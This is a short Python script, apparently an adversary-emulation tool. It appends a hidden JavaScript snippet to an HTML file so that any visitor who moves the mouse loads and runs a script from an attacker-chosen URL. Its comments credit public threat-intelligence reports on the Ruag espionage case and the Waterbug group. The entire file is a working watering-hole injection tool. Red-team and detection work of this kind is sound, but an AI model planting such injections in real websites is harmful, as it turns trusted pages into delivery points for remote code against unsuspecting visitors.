#!/bin/python

import argparse

parser = argparse.ArgumentParser(description='Append a redirection script an HTML file. This will immediately cause anyone who navigates to this page pull a piece of code from a URL of your choice.')
parser.add_argument("file", help="the file to which you are adding a redirection script")
parser.add_argument("destination", help="the URL to which you would like the html to redirect the user")
parser.add_argument("-v", "--verbose", help="Increase verbosity of script - prints the file and the destination.", action="store_true")
args = parser.parse_args()

if args.verbose:
    print("You are redirecting this file: ")
    print(args.file)
    print("To this location: ")
    print(args.destination)


injection_string = f"""?> <script>document.getElementsByTagName('body')[0].onmousemove = function() {{
        if (document.getElementById('xyz')) {{}} else {{
        var gam = document.createElement('script');
        gam.type = 'text/javascript';
        gam.async = true;
        gam.src = ('{args.destination}');
        var sm = document.getElementsByTagName('script')[0];
        sm.parentNode.insertBefore(gam, sm);
        var fl = document.createElement('span');
        fl.id = 'xyz';
        var d = document.getElementsByTagName('div')[0];
        d.parentNode.insertBefore(fl, d);
    }}
}}</script>
"""

with open(args.file, 'a') as f:
    f.write("\n")
    f.write(injection_string)

# CTI References
# injection_string slightly modified and pulled from: https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf
# Use of redirection in conjection with blogging platforms: https://docs.broadcom.com/doc/waterbug-attack-group
